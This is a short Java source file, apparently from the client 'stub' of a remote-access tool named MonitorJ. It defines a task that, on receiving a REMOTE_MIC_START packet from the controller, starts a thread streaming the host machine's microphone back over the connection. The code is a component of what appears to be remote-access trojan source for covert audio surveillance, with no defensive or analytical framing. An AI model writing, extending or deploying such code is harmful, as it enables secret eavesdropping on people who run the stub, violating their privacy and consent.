package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.client.threads.RemoteMicrophoneStream;

import java.io.IOException;

/**
 * Created by Josh on 4/07/2015.
 */
public class RemoteMicStartTask extends PacketTask {

    public static volatile Thread remoteMicStream;

    public RemoteMicStartTask() {
        super(Packets.REMOTE_MIC_START.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        (remoteMicStream = new Thread(new RemoteMicrophoneStream(client))).start();
    }
}
